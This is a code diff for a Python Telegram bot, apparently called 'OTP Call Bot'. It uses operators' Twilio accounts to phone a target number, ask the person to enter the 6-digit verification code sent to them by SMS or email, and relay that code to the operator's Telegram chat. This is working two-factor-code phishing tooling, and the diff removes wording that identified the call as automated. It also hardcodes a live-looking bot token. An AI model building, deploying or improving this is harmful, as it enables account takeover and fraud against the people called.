@@ -16,28 +16,56 @@ from twilio.rest import Client
 from twilio.twiml.voice_response import VoiceResponse, Gather
 
 # ============================
-# CONFIGURATION - Railway Friendly
+# CONFIGURATION
 # ============================
-# Get from Railway environment variables
-TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "7793179311:AAEcPTzRlwFxg3lDPLrt6UktqfDsq8-K2Mk")
-PORT = int(os.environ.get("PORT", 5000))
-RAILWAY_STATIC_URL = os.environ.get("RAILWAY_STATIC_URL", "")
-RAILWAY_PUBLIC_DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN", "")
+# HARDCODED VALUES
+TELEGRAM_BOT_TOKEN = "7793179311:AAEcPTzRlwFxg3lDPLrt6UktqfDsq8-K2Mk"
+PORT = 5000
+WEBHOOK_BASE_URL = "https://web-production-25142.up.railway.app"  # YOUR RAILWAY URL
 
-# Determine webhook URL for Twilio
-if RAILWAY_STATIC_URL:
-    WEBHOOK_BASE_URL = RAILWAY_STATIC_URL
-elif RAILWAY_PUBLIC_DOMAIN:
-    WEBHOOK_BASE_URL = f"https://{RAILWAY_PUBLIC_DOMAIN}"
-else:
-    # Fallback - you should set this in Railway variables
-    WEBHOOK_BASE_URL = "https://your-app-name.up.railway.app"
+# AUTO-GENERATE ENCRYPTION KEY
+def get_encryption_key():
+    """Generate or load encryption key"""
+    key_file = 'encryption.key'
+    
+    # Try to load existing key
+    if os.path.exists(key_file):
+        try:
+            with open(key_file, 'rb') as f:
+                key = f.read()
+                # Validate it's a proper Fernet key
+                Fernet(key)
+                logger.info("✅ Loaded existing encryption key")
+                return key
+        except Exception as e:
+            logger.warning(f"Invalid key file, generating new: {e}")
+    
+    # Generate new key
+    logger.info("🔑 Generating new encryption key...")
+    key = Fernet.generate_key()
+    
+    # Save for future use
+    try:
+        with open(key_file, 'wb') as f:
+            f.write(key)
+        logger.info("✅ Encryption key saved to file")
+    except Exception as e:
+        logger.warning(f"Could not save key file: {e}")
+    
+    return key
 
-# Generate or get encryption key
-ENCRYPTION_KEY = os.environ.get("ENCRYPTION_KEY")
-if not ENCRYPTION_KEY:
-    ENCRYPTION_KEY = Fernet.generate_key().decode()
-cipher = Fernet(ENCRYPTION_KEY.encode())
+# ============================
+# Setup logging
+# ============================
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# Initialize encryption
+ENCRYPTION_KEY = get_encryption_key()
+cipher = Fernet(ENCRYPTION_KEY)
 
 def encrypt_data(data):
     """Encrypt sensitive data"""
@@ -50,15 +78,6 @@ def decrypt_data(data):
     if data:
         return cipher.decrypt(data.encode()).decode()
     return None
-
-# ============================
-# Setup logging
-# ============================
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
-logger = logging.getLogger(__name__)
 
 # ============================
 # Flask webhook server
@@ -74,12 +93,12 @@ def home():
 def handle_twilio_voice():
     """Handle incoming call from Twilio"""
     call_sid = request.values.get('CallSid', '')
+    logger.info(f"Twilio voice webhook called for: {call_sid}")
     
     if call_sid not in active_calls:
-        logger.warning(f"Call SID not found in active calls: {call_sid}")
-        # Return a simple response
+        logger.warning(f"Unknown call SID: {call_sid}")
         resp = VoiceResponse()
-        resp.say("Call session expired. Goodbye.")
+        resp.say("Call session not found. Goodbye.")
         resp.hangup()
         return Response(str(resp), mimetype='text/xml')
     
@@ -88,11 +107,11 @@ def handle_twilio_voice():
     
     resp = VoiceResponse()
     
-    # Greeting message based on OTP type
+    # Greeting message
     if otp_type == 'sms':
-        message = "Hello. This is an automated verification call. Please enter the 6-digit verification code you received via SMS, followed by the pound key."
+        message = "Hello. Please enter the 6-digit verification code you received via SMS, followed by the pound key."
     else:
-        message = "Hello. This is an automated verification call. Please enter the 6-digit verification code you received via email, followed by the pound key."
+        message = "Hello. Please enter the 6-digit verification code you received via email, followed by the pound key."
     
     resp.say(message, voice='alice', language='en-US')
     
@@ -139,21 +158,18 @@ def handle_gather(call_sid):
             WHERE call_sid = ?
         ''', (digits, call_sid))
         
-        # Get user info to send Telegram notification
-        cursor.execute('''
-            SELECT telegram_chat_id FROM call_logs WHERE call_sid = ?
-        ''', (call_sid,))
+        # Get Telegram chat ID
+        cursor.execute('SELECT telegram_chat_id FROM call_logs WHERE call_sid = ?', (call_sid,))
         result = cursor.fetchone()
         
         if result:
             call_data['otp'] = digits
             call_data['status'] = 'completed'
             call_data['telegram_chat_id'] = result[0]
+            logger.info(f"✅ OTP saved for call {call_sid}")
         
         conn.commit()
         conn.close()
-        
-        logger.info(f"OTP saved for call {call_sid}")
         
     except Exception as e:
         logger.error(f"Error saving OTP: {e}")
@@ -174,8 +190,7 @@ def handle_status():
     logger.info(f"Call {call_sid} status: {call_status}")
     
     if call_sid in active_calls:
-        if call_status in ['completed', 'failed', 'busy', 'no-answer']:
-            # Update database
+        if call_status in ['completed', 'failed', 'busy', 'no-answer', 'canceled']:
             try:
                 conn = sqlite3.connect('otp_bot.db')
                 cursor = conn.cursor()
@@ -186,23 +201,6 @@ def handle_status():
                 ''', (call_status, call_sid))
                 conn.commit()
                 conn.close()
-                
-                # Send status to Telegram if call failed
-                if call_status in ['failed', 'busy', 'no-answer']:
-                    call_data = active_calls[call_sid]
-                    if 'telegram_chat_id' in call_data:
-                        from telegram import Bot
-                        bot = Bot(token=TELEGRAM_BOT_TOKEN)
-                        status_text = {
-                            'failed': 'failed',
-                            'busy': 'was busy',
-                            'no-answer': 'was not answered'
-                        }.get(call_status, call_status)
-                        
-                        bot.send_message(
-                            chat_id=call_data['telegram_chat_id'],
-                            text=f"❌ Call to `{call_data.get('target', 'unknown')}` {status_text}."
-                        )
                 
                 # Clean up
                 if call_sid in active_calls:
@@ -215,7 +213,7 @@ def handle_status():
 
 @flask_app.route('/health', methods=['GET'])
 def health_check():
-    """Health check endpoint for Railway"""
+    """Health check endpoint"""
     return {"status": "healthy", "timestamp": datetime.now().isoformat()}
 
 def run_flask():
@@ -237,9 +235,7 @@ def init_database():
             auth_token TEXT,
             twilio_phone TEXT,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            is_active INTEGER DEFAULT 1,
-            total_calls INTEGER DEFAULT 0,
-            balance_checked_at TIMESTAMP
+            is_active INTEGER DEFAULT 1
         )
     ''')
     
@@ -255,15 +251,9 @@ def init_database():
             otp_received TEXT,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
             completed_at TIMESTAMP,
-            duration_seconds INTEGER,
-            cost DECIMAL(10, 4),
             FOREIGN KEY (user_id) REFERENCES users (id)
         )
     ''')
-    
-    # Index for faster queries
-    cursor.execute('CREATE INDEX IF NOT EXISTS idx_user_id ON call_logs(user_id)')
-    cursor.execute('CREATE INDEX IF NOT EXISTS idx_call_sid ON call_logs(call_sid)')
     
     conn.commit()
     conn.close()
@@ -305,7 +295,7 @@ class TwilioManager:
             # Initialize Twilio client
             client = Client(account_sid, auth_token)
             
-            # Create the call with webhook
+            # Create the call
             call = client.calls.create(
                 url=f"{WEBHOOK_BASE_URL}/twilio/voice",
                 to=target_number,
@@ -313,9 +303,7 @@ class TwilioManager:
                 timeout=30,
                 status_callback=f"{WEBHOOK_BASE_URL}/twilio/status",
                 status_callback_event=['initiated', 'ringing', 'answered', 'completed'],
-                status_callback_method='POST',
-                machine_detection='Enable',
-                machine_detection_timeout=8
+                status_callback_method='POST'
             )
             
             # Store in database
@@ -324,11 +312,6 @@ class TwilioManager:
                 (user_id, telegram_chat_id, target_number, call_sid, otp_type, status)
                 VALUES (?, ?, ?, ?, ?, ?)
             ''', (user_id, chat_id, target_number, call.sid, otp_type, 'initiated'))
-            
-            # Update user's call count
-            cursor.execute('''
-                UPDATE users SET total_calls = total_calls + 1 WHERE id = ?
-            ''', (user_id,))
             
             conn.commit()
             conn.close()
@@ -339,8 +322,7 @@ class TwilioManager:
                 'telegram_chat_id': chat_id,
                 'target': target_number,
                 'otp_type': otp_type,
-                'status': 'initiated',
-                'start_time': datetime.now()
+                'status': 'initiated'
             }
             
             logger.info(f"✅ Call initiated: {call.sid} to {target_number}")
@@ -350,53 +332,14 @@ class TwilioManager:
             error_msg = str(e)
             logger.error(f"❌ Twilio call error: {error_msg}")
             
-            # User-friendly error messages
             if 'Authentication Error' in error_msg:
-                return None, "❌ Invalid Twilio credentials. Please update with /start"
+                return None, "❌ Invalid Twilio credentials"
             elif 'not authorized to call' in error_msg:
-                return None, "❌ Your Twilio number is not authorized to call this number"
+                return None, "❌ Number not authorized"
             elif 'insufficient funds' in error_msg.lower():
-                return None, "❌ Insufficient funds in Twilio account"
+                return None, "❌ Insufficient funds"
             else:
-                return None, f"❌ Twilio error: {error_msg[:100]}"
-    
-    async def check_balance(self, user_id):
-        """Check Twilio account balance"""
-        try:
-            conn = sqlite3.connect('otp_bot.db')
-            cursor = conn.cursor()
-            cursor.execute('''
-                SELECT account_sid, auth_token FROM users WHERE id = ?
-            ''', (user_id,))
-            user = cursor.fetchone()
-            conn.close()
-            
-            if not user:
-                return None, "User not found"
-            
-            account_sid = decrypt_data(user[0])
-            auth_token = decrypt_data(user[1])
-            
-            client = Client(account_sid, auth_token)
-            balance = client.api.v2010.accounts(account_sid).balance.fetch()
-            
-            # Update last checked time
-            conn = sqlite3.connect('otp_bot.db')
-            cursor = conn.cursor()
-            cursor.execute('''
-                UPDATE users SET balance_checked_at = CURRENT_TIMESTAMP WHERE id = ?
-            ''', (user_id,))
-            conn.commit()
-            conn.close()
-            
-            return {
-                'balance': float(balance.balance),
-                'currency': balance.currency,
-                'account': account_sid[:8] + '...'
-            }, None
-            
-        except Exception as e:
-            return None, f"Error checking balance: {str(e)}"
+                return None, f"❌ Error: {error_msg[:100]}"
     
     async def send_otp_notification(self, chat_id, call_sid, otp, target_number, otp_type):
         """Send OTP to Telegram user"""
@@ -431,8 +374,8 @@ twilio_manager = TwilioManager()
 # ============================
 (
     MAIN_MENU, SETUP_ACCOUNT_SID, SETUP_AUTH_TOKEN, SETUP_PHONE,
-    ENTER_TARGET, SELECT_OTP_TYPE, CONFIRM_CALL, TEST_CALL
-) = range(8)
+    ENTER_TARGET, SELECT_OTP_TYPE, CONFIRM_CALL
+) = range(7)
 
 # ============================
 # Telegram Bot Handlers
@@ -441,18 +384,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Start command"""
     user_id = update.effective_user.id
     
-    # Welcome message
     await update.message.reply_text(
-        f"🤖 *OTP Call Bot v2.0*\n\n"
+        f"🤖 *OTP Call Bot*\n\n"
         f"🔗 **Webhook URL:** `{WEBHOOK_BASE_URL}`\n"
-        f"🚀 **Deployed on:** Railway\n\n"
-        f"*Features:*\n"
-        f"✅ Real Twilio calls\n"
-        f"✅ SMS/Email OTP collection\n"
-        f"✅ Encrypted credentials\n"
-        f"✅ Call history\n"
-        f"✅ Balance checking\n\n"
-        f"Let's set up your Twilio account first:",
+        f"🔑 **Encryption:** Active\n\n"
+        f"*Setup your Twilio account to begin:*",
         parse_mode='Markdown'
     )
     
@@ -474,8 +410,7 @@ async def ask_for_account_sid(update: Update, context: ContextTypes.DEFAULT_TYPE
     """Ask for Twilio Account SID"""
     await update.message.reply_text(
         "🔧 *Step 1/3: Account SID*\n\n"
-        "Enter your **Twilio Account SID**:\n"
-        "Find at: console.twilio.com → Account Info\n\n"
+        "Enter your **Twilio Account SID**:\n\n"
         "Format: `ACxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`\n\n"
         "Type /cancel to abort.",
         parse_mode='Markdown'
@@ -500,8 +435,7 @@ async def setup_account_sid(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "✅ Account SID saved!\n\n"
         "🔧 *Step 2/3: Auth Token*\n\n"
-        "Enter your **Twilio Auth Token**:\n"
-        "Same page as Account SID.\n\n"
+        "Enter your **Twilio Auth Token**:\n\n"
         "Keep this secret!",
         parse_mode='Markdown'
     )
@@ -553,7 +487,7 @@ async def setup_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Test credentials before saving
     try:
         client = Client(context.user_data['account_sid'], context.user_data['auth_token'])
-        # Try to get account info to verify credentials
+        # Try to get account info to verify
         account = client.api.accounts(context.user_data['account_sid']).fetch()
         
         # Save to database
@@ -579,7 +513,7 @@ async def setup_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"✅ Credentials verified\n"
             f"✅ Phone number: `{phone}`\n"
             f"✅ Account: `{account.friendly_name or 'Twilio Account'}`\n\n"
-            f"*Next:* Use /call to make your first OTP call!",
+            f"*Next:* Use the menu to make a call!",
             parse_mode='Markdown'
         )
         
@@ -591,11 +525,8 @@ async def setup_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"❌ *Credential Test Failed*\n\n"
             f"Error: {str(e)}\n\n"
-            f"Please check:\n"
-            f"1. Account SID and Auth Token\n"
-            f"2. Account is active\n"
-            f"3. Phone number is correct\n\n"
-            f"Let's try again. Enter Account SID:"
+            f"Please check your credentials and try again.\n"
+            f"Enter Account SID:"
         )
         return SETUP_ACCOUNT_SID
 
@@ -606,8 +537,7 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')],
         [InlineKeyboardButton("📊 Call History", callback_data='view_history')],
         [InlineKeyboardButton("🔧 Update Credentials", callback_data='update_creds')],
-        [InlineKeyboardButton("🔄 Test Call", callback_data='test_call')],
-        [InlineKeyboardButton("ℹ️ Help / Info", callback_data='help')],
+        [InlineKeyboardButton("ℹ️ Help", callback_data='help')],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -708,10 +638,9 @@ async def select_otp_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['otp_type'] = otp_type
     target = context.user_data['target_number']
     
-    # Show confirmation with cost
+    # Show confirmation
     keyboard = [
         [InlineKeyboardButton("✅ Start Call ($0.0135/min)", callback_data='start_call')],
-        [InlineKeyboardButton("💰 Check Balance First", callback_data='check_balance_first')],
         [InlineKeyboardButton("🔙 Cancel", callback_data='back_main')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -772,9 +701,9 @@ async def start_real_call(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"❌ *Call Failed*\n\n"
             f"**Error:** {error}\n\n"
             f"**Solutions:**\n"
-            f"1. Check balance with /balance\n"
-            f"2. Verify credentials with /start\n"
-            f"3. Ensure number is verified in Twilio",
+            f"1. Check balance\n"
+            f"2. Verify credentials\n"
+            f"3. Ensure number is verified",
             parse_mode='Markdown'
         )
     else:
@@ -805,7 +734,7 @@ async def monitor_call_for_otp(update: Update, context: ContextTypes.DEFAULT_TYP
     chat_id = update.effective_chat.id
     
     import asyncio
-    max_wait = 90  # 90 seconds max
+    max_wait = 60  # 60 seconds max
     check_interval = 2  # Check every 2 seconds
     
     for i in range(max_wait // check_interval):
@@ -862,26 +791,41 @@ async def check_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     db_user_id = user[0]
     
-    # Check balance
-    balance_data, error = await twilio_manager.check_balance(db_user_id)
+    # Get user's credentials
+    conn = sqlite3.connect('otp_bot.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT account_sid, auth_token FROM users WHERE id = ?', (db_user_id,))
+    user_data = cursor.fetchone()
+    conn.close()
     
-    if error:
-        await query.edit_message_text(
-            f"❌ *Balance Check Failed*\n\n"
-            f"Error: {error}\n\n"
-            f"Check credentials with /start",
-            parse_mode='Markdown'
-        )
-    else:
+    if not user_data:
+        await query.edit_message_text("❌ Credentials not found")
+        return MAIN_MENU
+    
+    account_sid = decrypt_data(user_data[0])
+    auth_token = decrypt_data(user_data[1])
+    
+    try:
+        # Get balance from Twilio
+        client = Client(account_sid, auth_token)
+        balance = client.api.v2010.accounts(account_sid).balance.fetch()
+        
         await query.edit_message_text(
             f"💰 *Twilio Account Balance*\n\n"
-            f"**Balance:** ${balance_data['balance']:.2f} {balance_data['currency']}\n"
-            f"**Account:** {balance_data['account']}\n\n"
+            f"**Balance:** ${float(balance.balance):.2f} {balance.currency}\n"
+            f"**Account:** {account_sid[:8]}...\n\n"
             f"📞 *Call Costs:*\n"
             f"• Outbound calls: $0.0135/min\n"
             f"• 1-minute call: ~$0.02\n"
             f"• Phone number: ~$1-2/month\n\n"
-            f"⚡ Ensure sufficient balance for calls!",
+            f"⚡ Ensure sufficient balance!",
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        await query.edit_message_text(
+            f"❌ *Balance Check Failed*\n\n"
+            f"Error: {str(e)}\n\n"
+            f"Check credentials with /start",
             parse_mode='Markdown'
         )
     
@@ -917,20 +861,10 @@ async def view_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ''', (db_user_id,))
     
     calls = cursor.fetchall()
-    
-    # Get total calls
-    cursor.execute('SELECT COUNT(*) FROM call_logs WHERE user_id = ?', (db_user_id,))
-    total_calls = cursor.fetchone()[0]
-    
-    # Get completed calls
-    cursor.execute('SELECT COUNT(*) FROM call_logs WHERE user_id = ? AND status = "completed"', (db_user_id,))
-    completed_calls = cursor.fetchone()[0]
-    
     conn.close()
     
     if calls:
         history_text = f"📊 *Call History*\n\n"
-        history_text += f"📈 **Stats:** {completed_calls}/{total_calls} completed\n\n"
         
         for call in calls:
             target, otp_type, status, otp, timestamp = call
@@ -996,9 +930,6 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     • ALWAYS get consent before calling
     • Use only for legitimate purposes
     • You pay for all calls
-    • Respect all laws
-
-    *Support:* Contact if issues
     """
     
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_main')]]
@@ -1009,45 +940,6 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=reply_markup,
         parse_mode='Markdown'
     )
-
-async def test_call(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Test call functionality"""
-    query = update.callback_query
-    await query.answer()
-    
-    user_id = update.effective_user.id
-    
-    # Check if user has setup
-    conn = sqlite3.connect('otp_bot.db')
-    cursor = conn.cursor()
-    cursor.execute('SELECT twilio_phone FROM users WHERE telegram_id = ?', (user_id,))
-    user = cursor.fetchone()
-    conn.close()
-    
-    if not user:
-        await query.edit_message_text("❌ Setup required first with /start")
-        return MAIN_MENU
-    
-    twilio_phone = user[0]
-    
-    keyboard = [
-        [InlineKeyboardButton("📞 Call My Own Number", callback_data='test_own')],
-        [InlineKeyboardButton("🎧 Test Audio", callback_data='test_audio')],
-        [InlineKeyboardButton("🔙 Back", callback_data='back_main')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    await query.edit_message_text(
-        f"🔧 *Test Mode*\n\n"
-        f"**Your Twilio Number:** `{twilio_phone}`\n\n"
-        f"*Test options:*\n"
-        f"1. Call your own number - test full flow\n"
-        f"2. Test audio - verify voice works\n\n"
-        f"Select an option:",
-        reply_markup=reply_markup,
-        parse_mode='Markdown'
-    )
-    return TEST_CALL
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Cancel operation"""
@@ -1072,6 +964,9 @@ def main():
     print(f"Webhook URL: {WEBHOOK_BASE_URL}")
     print(f"Port: {PORT}")
     print("=" * 60)
+    print("🔑 Encryption key auto-generated")
+    print("✅ Database initialized")
+    print("=" * 60)
     
     # Start Flask server in background thread
     flask_thread = Thread(target=run_flask, daemon=True)
@@ -1093,7 +988,6 @@ def main():
                 CallbackQueryHandler(check_balance, pattern='^check_balance$'),
                 CallbackQueryHandler(view_history, pattern='^view_history$'),
                 CallbackQueryHandler(ask_for_account_sid, pattern='^update_creds$'),
-                CallbackQueryHandler(test_call, pattern='^test_call$'),
                 CallbackQueryHandler(help_command, pattern='^help$'),
                 CallbackQueryHandler(show_main_menu, pattern='^back_main$'),
             ],
@@ -1115,10 +1009,6 @@ def main():
             ],
             CONFIRM_CALL: [
                 CallbackQueryHandler(start_real_call, pattern='^start_call$'),
-                CallbackQueryHandler(check_balance, pattern='^check_balance_first$'),
-                CallbackQueryHandler(show_main_menu, pattern='^back_main$'),
-            ],
-            TEST_CALL: [
                 CallbackQueryHandler(show_main_menu, pattern='^back_main$'),
             ],
         },
@@ -1135,7 +1025,7 @@ def main():
     
     print("\n✅ Bot is running...")
     print("📞 Commands: /start, /call, /balance, /history, /help")
-    print("🌐 Webhook URL set to:", WEBHOOK_BASE_URL)
+    print("🌐 Webhook URL:", WEBHOOK_BASE_URL)
     print("=" * 60)
     
     # Run the bot
